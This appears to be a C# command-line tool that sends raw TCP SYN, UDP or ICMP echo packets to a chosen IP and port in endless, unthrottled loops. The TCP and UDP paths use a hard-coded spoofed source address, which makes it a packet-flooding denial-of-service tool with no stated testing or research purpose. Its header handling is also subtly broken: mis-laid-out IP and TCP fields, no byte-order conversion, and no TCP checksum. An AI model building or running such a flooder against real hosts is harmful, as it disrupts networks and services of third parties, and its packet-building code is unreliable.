using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Linq;

class RawSocketSender
{
    // Calculate checksum for IP and transport layer protocols
    private static ushort Checksum(byte[] buffer)
    {
        uint sum = 0;
        int length = buffer.Length;
        int index = 0;

        while (length > 1)
        {
            sum += (uint)(buffer[index] << 8 | buffer[index + 1]);
            index += 2;
            length -= 2;
        }

        if (length == 1)
        {
            sum += (uint)(buffer[index] << 8);
        }

        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return (ushort)~sum;
    }

    private static void SendTcpPacket(string destIp, int destPort)
    {
        using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp))
        {
            while (true) {
                sock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

                // Prepare IP header and TCP header
                IPHeader iph = new IPHeader
                {
                    IHL = 5,
                    Version = 4,
                    TOS = 0,
                    TotalLength = (ushort)(20 + 20), // IP header (20 bytes) + TCP header (20 bytes)
                    ID = 54321,
                    FragmentOffset = 0,
                    TTL = 255,
                    Protocol = (byte)ProtocolType.Tcp,
                    Checksum = 0,
                    SourceAddress = IPAddress.Parse("192.168.1.1").GetAddressBytes(),
                    DestinationAddress = IPAddress.Parse(destIp).GetAddressBytes()
                };

                TCPHeader tcph = new TCPHeader
                {
                    SourcePort = 12345,
                    DestinationPort = (ushort)destPort,
                    SequenceNumber = 0,
                    AcknowledgmentNumber = 0,
                    DataOffset = 5,
                    Flags = 0x02, // SYN flag
                    Window = 5840,
                    Checksum = 0,
                    UrgentPointer = 0
                };

                byte[] ipHeaderBytes = iph.ToByteArray();
                byte[] tcpHeaderBytes = tcph.ToByteArray();

                byte[] packet = new byte[ipHeaderBytes.Length + tcpHeaderBytes.Length];
                Buffer.BlockCopy(ipHeaderBytes, 0, packet, 0, ipHeaderBytes.Length);
                Buffer.BlockCopy(tcpHeaderBytes, 0, packet, ipHeaderBytes.Length, tcpHeaderBytes.Length);

                // Set IP header checksum
                iph.Checksum = Checksum(packet.Take(ipHeaderBytes.Length).ToArray());
                Buffer.BlockCopy(iph.ToByteArray(), 0, packet, 0, ipHeaderBytes.Length);

                // Send packet
                IPEndPoint destEndPoint = new IPEndPoint(IPAddress.Parse(destIp), destPort);
                sock.SendTo(packet, destEndPoint);
            }
        }
    }

    private static void SendUdpPacket(string destIp, int destPort)
    {
        using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp))
        {
            while (true) {
                sock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

                // Prepare IP header and UDP header
                IPHeader iph = new IPHeader
                {
                    IHL = 5,
                    Version = 4,
                    TOS = 0,
                    TotalLength = (ushort)(20 + 8), // IP header (20 bytes) + UDP header (8 bytes)
                    ID = 54321,
                    FragmentOffset = 0,
                    TTL = 255,
                    Protocol = (byte)ProtocolType.Udp,
                    Checksum = 0,
                    SourceAddress = IPAddress.Parse("192.168.1.1").GetAddressBytes(),
                    DestinationAddress = IPAddress.Parse(destIp).GetAddressBytes()
                };

                UDPHeader udph = new UDPHeader
                {
                    SourcePort = 12345,
                    DestinationPort = (ushort)destPort,
                    Length = (ushort)8, // UDP header length
                    Checksum = 0
                };

                byte[] ipHeaderBytes = iph.ToByteArray();
                byte[] udpHeaderBytes = udph.ToByteArray();

                byte[] packet = new byte[ipHeaderBytes.Length + udpHeaderBytes.Length];
                Buffer.BlockCopy(ipHeaderBytes, 0, packet, 0, ipHeaderBytes.Length);
                Buffer.BlockCopy(udpHeaderBytes, 0, packet, ipHeaderBytes.Length, udpHeaderBytes.Length);

                // Set IP header checksum
                iph.Checksum = Checksum(packet.Take(ipHeaderBytes.Length).ToArray());
                Buffer.BlockCopy(iph.ToByteArray(), 0, packet, 0, ipHeaderBytes.Length);

                // Send packet
                IPEndPoint destEndPoint = new IPEndPoint(IPAddress.Parse(destIp), destPort);
                sock.SendTo(packet, destEndPoint);
            }
        }
    }

    private static void SendIcmpPacket(string destIp)
    {
        using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
        {
            while (true) {
                // Prepare ICMP header
                ICMPHeader icmp = new ICMPHeader
                {
                    Type = 8, // Echo request
                    Code = 0,
                    Checksum = 0,
                    Identifier = 0x1234,
                    SequenceNumber = 0x0001
                };

                byte[] icmpHeaderBytes = icmp.ToByteArray();
                byte[] packet = new byte[icmpHeaderBytes.Length];

                Buffer.BlockCopy(icmpHeaderBytes, 0, packet, 0, icmpHeaderBytes.Length);

                // Set ICMP checksum
                icmp.Checksum = Checksum(packet);
                Buffer.BlockCopy(icmp.ToByteArray(), 0, packet, 0, icmpHeaderBytes.Length);

                IPEndPoint destEndPoint = new IPEndPoint(IPAddress.Parse(destIp), 0);
                sock.SendTo(packet, destEndPoint);
            }
        }
    }

    public static void Main(string[] args)
    {
        if (args.Length != 3)
        {
            Console.WriteLine("Usage: <dest_ip> <dest_port> <protocol>");
            Console.WriteLine("protocol: tcp, udp, icmp");
            return;
        }

        string destIp = args[0];
        int destPort = int.Parse(args[1]);
        string protocol = args[2].ToLower();

        if (protocol == "tcp")
        {
            SendTcpPacket(destIp, destPort);
        }
        else if (protocol == "udp")
        {
            SendUdpPacket(destIp, destPort);
        }
        else if (protocol == "icmp")
        {
            SendIcmpPacket(destIp);
        }
        else
        {
            Console.WriteLine($"Unknown protocol: {protocol}");
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IPHeader
    {
        public byte IHL;
        public byte Version;
        public byte TOS;
        public ushort TotalLength;
        public ushort ID;
        public ushort FragmentOffset;
        public byte TTL;
        public byte Protocol;
        public ushort Checksum;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public byte[] SourceAddress;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public byte[] DestinationAddress;

        public byte[] ToByteArray()
        {
            byte[] bytes = new byte[Marshal.SizeOf(typeof(IPHeader))];
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            Marshal.StructureToPtr(this, handle.AddrOfPinnedObject(), true);
            handle.Free();
            return bytes;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TCPHeader
    {
        public ushort SourcePort;
        public ushort DestinationPort;
        public uint SequenceNumber;
        public uint AcknowledgmentNumber;
        public byte DataOffset;
        public byte Flags;
        public ushort Window;
        public ushort Checksum;
        public ushort UrgentPointer;

        public byte[] ToByteArray()
        {
            byte[] bytes = new byte[Marshal.SizeOf(typeof(TCPHeader))];
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            Marshal.StructureToPtr(this, handle.AddrOfPinnedObject(), true);
            handle.Free();
            return bytes;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UDPHeader
    {
        public ushort SourcePort;
        public ushort DestinationPort;
        public ushort Length;
        public ushort Checksum;

        public byte[] ToByteArray()
        {
            byte[] bytes = new byte[Marshal.SizeOf(typeof(UDPHeader))];
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            Marshal.StructureToPtr(this, handle.AddrOfPinnedObject(), true);
            handle.Free();
            return bytes;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct ICMPHeader
    {
        public byte Type;
        public byte Code;
        public ushort Checksum;
        public ushort Identifier;
        public ushort SequenceNumber;

        public byte[] ToByteArray()
        {
            byte[] bytes = new byte[Marshal.SizeOf(typeof(ICMPHeader))];
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            Marshal.StructureToPtr(this, handle.AddrOfPinnedObject(), true);
            handle.Free();
            return bytes;
        }
    }
}

// dotnet build
// dotnet run -- <dest_ip> <dest_port> <protocol>